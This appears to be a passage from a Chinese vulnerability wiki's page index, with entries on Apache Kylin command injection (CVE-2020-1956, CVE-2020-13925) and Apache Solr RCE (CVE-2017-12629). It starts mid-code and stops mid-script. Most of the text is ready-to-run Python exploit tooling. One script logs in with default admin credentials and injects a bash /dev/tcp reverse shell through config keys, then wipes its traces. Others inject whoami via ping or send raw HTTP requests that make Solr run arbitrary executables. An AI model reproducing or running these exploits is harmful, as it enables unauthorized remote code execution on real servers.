sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } ç”±æ­¤å¯ä»¥å¾—å‡ºæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªå¯æ§çš„å‚æ•°ï¼Œæ‰§è¡Œä»»æ„æˆ‘ä»¬éœ€è¦çš„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹ä¸€ä¸ªshellï¼Œè®¾ç½®çš„é…ç½®ä¸º [!NOTE] kylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=echo;bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 kylin.tool.auto-migrate-cube.dest-config=shell å†å»å‘é€POSTè¯·æ±‚ /kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate æˆåŠŸåå¼¹ä¸€ä¸ªshell æ¼æ´åˆ©ç”¨POC [!NOTE] POCåˆ©ç”¨å‰ææ˜¯æ‹¥æœ‰è´¦å·å¯†ç ï¼Œé»˜è®¤è´¦å·å¯†ç æ˜¯ admin/KYLIN #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(æ ¼å¼ä¸ºUser:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] è´¦å·å¯†ç å‡ºç°é”™è¯¯ \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] æˆåŠŸç™»å½•ï¼Œè·å¾—JSESSIONIDï¼š\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"],Authorization except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, cookie, IP, PORT, Authorization): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\",\"kylin.tool.auto-migrate-cube.src-config\",\"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"true\",\"echo;bash -i >& /dev/tcp/{}/{} 0>&1;echo\".format(IP, PORT), \"shell\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\"+cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå°†\" + key[i] +\"è®¾ç½®ä¸º\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] è®¾ç½®\" + key[i] +\"ä¸º\" + value[i] +\"å¤±è´¥\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, cookie): print(\"\\033[35m[o] æ­£åœ¨åå¼¹shell......\\033[0m\") vuln_url = target_url + \"/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.post(url=vuln_url, headers=headers) POC_4(target_url, cookie) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) def POC_4(target_url, cookie): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\", \"kylin.tool.auto-migrate-cube.src-config\", \"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"flase\", \"echo;echo;echo\", \"None\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå°†\" + key[i] +\"è®¾ç½®ä¸º\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] è®¾ç½®\" + key[i] +\"ä¸º\" + value[i] +\"å¤±è´¥\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) print(\"\\033[35m[o] æˆåŠŸæ¸…ç†ç—•è¿¹\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie,Authorization = POC_1(target_url) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_2(target_url, cookie, IP, PORT, Authorization) POC_3(target_url, cookie) å‚è€ƒæ–‡ç«  Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 POC åˆ†æ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-29 15:54:35 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925.html","title":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925","keywords":"","body":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925 æ¼æ´æè¿° 6æœˆï¼Œäº¬ä¸œå®‰å…¨çš„è“å†›å›¢é˜Ÿå‘ç°äº†ä¸€ä¸ª apache kylin è¿œç¨‹å‘½ä»¤æ‰§è¡Œä¸¥é‡æ¼æ´ï¼ˆ CVE-2020-13925ï¼‰ã€‚é»‘å®¢å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œç™»å½•ä»»ä½•ç®¡ç†å‘˜è´¦å·å’Œå¯†ç é»˜è®¤æœªä¿®æ”¹çš„è´¦å·ï¼Œè·å¾—ç®¡ç†å‘˜æƒé™ã€‚ç”±äºApache Kylinè¢«å¹¿æ³›åº”ç”¨äºä¼ä¸šçš„å¤§æ•°æ®åˆ†æå¹³å°ï¼Œå› æ­¤è¯¥æ¼æ´å°†å¯¹ä¼ä¸šæ ¸å¿ƒæ•°æ®å…·æœ‰è¾ƒå¤§çš„å±å®³ï¼Œå­˜åœ¨æ•°æ®æ³„éœ²é£é™©ï¼Œå»ºè®®ç”¨æˆ·å°½å¿«å‡çº§è½¯ä»¶è‡³å®‰å…¨ç‰ˆæœ¬ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1,Kylin 3.0.2 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨ docker æ¥æ­å»ºéœ€è¦çš„ç¯å¢ƒ Kylinå®˜æ–¹æ–‡æ¡£ docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] å¦‚æœæœåŠ¡å™¨å†…å­˜è¾ƒå°ï¼Œå¯ä¸é€‰æ‹© -m 8G å‚æ•° docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 æ‰“å¼€åä½¿ç”¨é»˜è®¤è´¦å·å¯†ç admin/KYLINç™»å½•ï¼Œå‡ºç°åˆå§‹ç•Œé¢å³ä¸ºæˆåŠŸ æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„ä»£ç æ–‡ä»¶åœ¨server-base/src/main/java/org/apache/kylin/rest/controller/DiagnosisController.java /** * Get diagnosis information for project */ @RequestMapping(value = \"/project/{project}/download\", method = { RequestMethod.GET }, produces = { \"application/json\" }) @ResponseBody public void dumpProjectDiagnosisInfo(@PathVariable String project, final HttpServletRequest request, final HttpServletResponse response) { try (AutoDeleteDirectory diagDir = new AutoDeleteDirectory(\"diag_project\", \"\")) { String filePath = dgService.dumpProjectDiagnosisInfo(project, diagDir.getFile()); setDownloadResponse(filePath, response); } catch (IOException e) { throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); } } è¿™é‡Œå¯ä»¥çœ‹åˆ° {project}å‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„å˜é‡ï¼Œå‘ä¸‹è·Ÿè¿›dumpProjectDiagnosisInfoå‡½æ•° public String dumpProjectDiagnosisInfo(String project, File exportPath) throws IOException { aclEvaluate.checkProjectOperationPermission(project); String[] args = { project, exportPath.getAbsolutePath() }; runDiagnosisCLI(args); return getDiagnosisPackageName(exportPath); } é¦–å…ˆé€šè¿‡checkProjectOperationPermissionå‡½æ•°æ¥æ£€æŸ¥è¯¥projectæ˜¯å¦è®¸å¯ï¼Œç„¶åæ„å»ºä¸€ä¸ªargsçš„å­—ç¬¦ä¸²æ•°ç»„ï¼Œçœ‹ä¸€ä¸‹checkProjectOperationPermissionå‡½æ•° public void checkProjectOperationPermission(String projectName) { ProjectInstance projectInstance = getProjectInstance(projectName); aclUtil.hasProjectOperationPermission(projectInstance); } è¿™é‡Œä¼ å…¥projectNameï¼Œç„¶åé€šè¿‡getProjectInstanceæ¥è·å–é¡¹ç›®å®ä¾‹,è·Ÿè¿›getProjectInstance private ProjectInstance getProjectInstance(String projectName) { return ProjectManager.getInstance(KylinConfig.getInstanceFromEnv()).getProject(projectName); } å› ä¸º projectName ä¼šè¢«æˆ‘ä»¬æ›¿æ¢æ‰ï¼Œæ‰€ä»¥ä¸ä¼šè·å¾—ä¸€ä¸ªæ­£ç¡®çš„projectName,åˆ™ä¼šè¿”å›ä¸€ä¸ªNullï¼ŒæŸ¥çœ‹ä¸‹hasProjectOperationPermissionå‡½æ•° @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#project, 'ADMINISTRATION')\" + \" or hasPermission(#project, 'MANAGEMENT')\" + \" or hasPermission(#project, 'OPERATION')\") public boolean hasProjectOperationPermission(ProjectInstance project) { return true; } è¿™é‡Œå¹¶æ²¡æœ‰å¯¹projectNameè¿›è¡Œæ£€éªŒï¼Œåªå¯¹ç”¨æˆ·èº«ä»½è¿›è¡Œäº†æ£€éªŒï¼Œå½“ä¸ºADMINã€ADMINISTRATIONã€MANAGEMENTã€OPERATIONç­‰æƒé™ï¼Œè¯¥å€¼é»˜è®¤è¿”å›ä¸ºtrueï¼Œå›åˆ° dumpProjectDiagnosisInfoå‡½æ•°ï¼Œå‘ä¸‹ç»§ç»­è·Ÿè¿›runDiagnosisCLIå‡½æ•° private void runDiagnosisCLI(String[] args) throws IOException { Message msg = MsgPicker.getMsg(); File cwd = new File(\"\"); logger.debug(\"Current path: \" + cwd.getAbsolutePath()); logger.debug(\"DiagnosisInfoCLI args: \" + Arrays.toString(args)); File script = new File(KylinConfig.getKylinHome() + File.separator + \"bin\", \"diag.sh\"); if (!script.exists()) { throw new BadRequestException( String.format(Locale.ROOT, msg.getDIAG_NOT_FOUND(), script.getAbsolutePath())); } String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); if (cmdOutput.getFirst() != 0) { throw new BadRequestException(msg.getGENERATE_DIAG_PACKAGE_FAIL()); } } æ³¨æ„çœ‹è¿™å‡ è¡Œä»£ç  String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); ä¸ Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 ç±»ä¼¼ï¼ŒåŒæ ·ä¹Ÿæ˜¯ç»è¿‡executeå‡½æ•°ï¼Œè€ŒdigCmdåŒæ ·ä¹Ÿæ˜¯ç»è¿‡äº†å‘½ä»¤æ‹¼æ¥ private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ§åˆ¶ {project} è¯·æ±‚å°±å¯ä»¥é€ æˆå‘½ä»¤æ³¨å…¥ /kylin/api/diag/project/{project}/download /kylin/api/diag/project/||ping `whoami.111.111.111`||/download æ‹¼æ¥ååˆ™å‡ºç° /home/admin/apache-kylin-3.0.1-bin-hbase1x/bin/diag.sh {project} {diagDir} è¿™é‡Œé€šè¿‡æŠ¥é”™è¯­å¥å¯ä»¥å›æ˜¾å‘½ä»¤éªŒè¯æ¼æ´å­˜åœ¨ throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); åœ¨ä¿®å¤ä¸­ï¼Œè¿‡æ»¤äº†||,&&ç­‰ç¬¦å·ï¼Œé€ æˆæ— æ³•å‘½ä»¤æ³¨å…¥ æ¼æ´é€šæŠ¥ä¸­å…±ä¸¤ä¸ªåˆ©ç”¨ç‚¹ /kylin/api/diag/project/{project}/download /kylin/api/diag/job/{jobId}/download æŸ¥çœ‹å‡½æ•°å‘ç°åˆ©ç”¨æ–¹å¼ç›¸åŒï¼Œç›´æ¥åˆ©ç”¨jobä¼šå¤±è´¥ï¼Œå› ä¸º {project}é»˜è®¤æœ‰ä¸€ä¸ªlearn_kylinï¼Œè€Œjobæ²¡æœ‰ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(æ ¼å¼ä¸ºUser:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] è´¦å·å¯†ç å‡ºç°é”™è¯¯ \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] æˆåŠŸç™»å½•ï¼Œè·å¾—JSESSIONIDï¼š\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"] except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, cookie): vuln_url = target_url + '/kylin/api/diag/project/%7C%7Cping%20%60whoami%60.111.111.111%7C%7C/download' headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \".111.111.111||\" in response.text: whoami = re.findall(r'ping: (.*?).111.111.111: æœªçŸ¥çš„åç§°æˆ–æœåŠ¡',response.text)[0] print(\"\\033[32m[o] å­˜åœ¨æ¼æ´ï¼ŒæˆåŠŸæ‰§è¡Œwhoamiï¼Œå“åº”ä¸º{}\\033[0m\".format(whoami)) else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,||,&&ç­‰ç¬¦å·å·²è¢«è¿‡æ»¤ï¼Œæ— æ³•é€ æˆå‘½ä»¤æ³¨å…¥\\033[0m\") except: print(\"\\033[31m[x] è¯·æ±‚è¶…æ—¶\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie = POC_1(target_url) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) POC_2(target_url, cookie) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/","title":"Apache Solr","keywords":"","body":"Apache Solr Apache Solr RCE è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193 Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629 Apache Solr XXE æ¼æ´ CVE-2017-12629 Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409 Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957 Apache Solr ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-17 22:18:08 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr RCE è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr RCE è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629.html","title":"Apache Solr RCE è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2017-12629","keywords":"","body":"Apache Solr RCE è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2017-12629 æ¼æ´æè¿° Apache Solr æ˜¯ä¸€ä¸ªå¼€æºçš„æœç´¢æœåŠ¡å™¨ã€‚Solr ä½¿ç”¨ Java è¯­è¨€å¼€å‘ï¼Œä¸»è¦åŸºäº HTTP å’Œ Apache Lucene å®ç°ã€‚åŸç†å¤§è‡´æ˜¯æ–‡æ¡£é€šè¿‡Httpåˆ©ç”¨XMLåŠ åˆ°ä¸€ä¸ªæœç´¢é›†åˆä¸­ã€‚æŸ¥è¯¢è¯¥é›†åˆä¹Ÿæ˜¯é€šè¿‡ httpæ”¶åˆ°ä¸€ä¸ªXML/JSONå“åº”æ¥å®ç°ã€‚æ­¤æ¬¡7.1.0ä¹‹å‰ç‰ˆæœ¬æ€»å…±çˆ†å‡ºä¸¤ä¸ªæ¼æ´ï¼šXMLå®ä½“æ‰©å±•æ¼æ´ï¼ˆXXEï¼‰å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰ï¼ŒäºŒè€…å¯ä»¥è¿æ¥æˆåˆ©ç”¨é“¾ï¼Œç¼–å·å‡ä¸ºCVE-2017-12629ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d æ¼æ´å¤ç° è¿œç¨‹å‘½ä»¤æ‰§è¡Œ å…ˆè¯·æ±‚urlåœ°å€è·å– core å†…å®¹ http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] é€šè¿‡æŸ¥çœ‹ä»£ç ï¼Œèƒ½å¤Ÿè§¦å‘å‘½ä»¤æ‰§è¡Œçš„äº‹ä»¶æœ‰ä¸¤ä¸ªï¼špostCommit å’Œ newSearcher ä½¿ç”¨ postCommit ç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…ç”¨äºè½½å…¥ç¼“å­˜ä¸­ [!NOTE] exe : ping æ‰§è¡Œçš„å‘½ä»¤ dir: å‘½ä»¤å­˜åœ¨çš„ç›®å½•ä½ç½® args:å‘½ä»¤å‚æ•° å¦‚ä¸‹è¯·æ±‚åŒ…æ‰§è¡Œçš„æ˜¯ /bin/ping 1.1.1.1 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"postCommit\", \"name\":\"newlistener-1\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"ping\", \"dir\":\"/bin/\", \"args\":[\"1.1.1.1\"] } } ç¬¬äºŒä¸ªè¯·æ±‚åŒ…ç”¨äºæ›´æ–°ç¼“å­˜å¹¶æ‰§è¡Œå‘½ä»¤ POST /solr/demo/update HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 [{\"id\":\"test\"}] [!NOTE] æ³¨æ„ ç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…çš„è¿™ä¸ªä½ç½® \"name\":\"newlistener-1\", listererçš„åå­—éœ€è¦æ›¿æ¢ï¼Œä¾‹å¦‚ç¬¬ä¸€æ¬¡ ä¸º newlistener-1 ï¼Œç¬¬äºŒæ¬¡åˆ™éœ€è¦æ”¹ä¸º newlistener-2 æ³¨æ„ ç¬¬äºŒä¸ªè¯·æ±‚åŒ…çš„è¿™ä¸ªä½ç½® [{\"id\":\"test\"}]ï¼Œ åŒç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…çš„nameï¼Œæ¯æ‰§è¡Œä¸€æ¬¡å°±éœ€è¦æ›´æ¢ id ,ä¾‹å¦‚ç¬¬ä¸€æ¬¡ ä¸º test ï¼Œç¬¬äºŒæ¬¡åˆ™éœ€è¦æ”¹ä¸º tset-2 æ³¨æ„ Content-Type: application/json éœ€è¦æ·»åŠ  ä¸æ›´æ”¹æ‰§è¡Œå‘ç”ŸæŠ¥é”™ç¤ºä¾‹ è¿›å…¥dockerå®¹å™¨æŸ¥çœ‹å‘ç°å‘½ä»¤å·²ç»æ‰§è¡Œ ä½¿ç”¨ newSearcher ä½¿ç”¨ newSearcherå¯ä»¥ç›´æ¥åŠ è½½å…¥ç¼“å­˜æ‰§è¡Œå‘½ä»¤ è¯·æ±‚åŒ…å¦‚ä¸‹ POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"newSearcher\", \"name\":\"newlistener-2\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"bash\", \"dir\":\"/bin/\", \"args\":[ \"-c\", \"mkdir /tmp/vuln\", ] } } [!NOTE] æ³¨æ„ç‚¹åŒä¸Šï¼Œä¹Ÿéœ€è¦æ¯æ¬¡æ‰§è¡Œæ›´æ”¹ \"name\":\"newlistener-2\" çš„å‚æ•° æˆåŠŸæ‰§è¡Œäº†åˆ›å»ºæ–‡ä»¶çš„å‘½ä»¤ å…³äº å¦‚æœæƒ³è¦æ‰§è¡Œå…¶ä»–å‘½ä»¤,åˆ™éœ€è¦å‘½ä»¤çš„çš„ä½ç½®ï¼Œä¾‹å¦‚æ‰§è¡Œpingï¼Œåˆ™éœ€è¦è®¾ç½®dirå‚æ•°ä¸º /usr/bin/ping æˆ–è€… /bin/pingï¼Œå¦‚æœéœ€è¦æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨åˆ™å¯ä»¥ä½¿ç”¨ dnslogæ¥æ£€æµ‹ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslogåœ°å€(æ¼æ´å¤–è¿æ£€æµ‹) \\033[0m') print('+ \\033[36mCmd >>> shell(åå¼¹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url, n): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\": 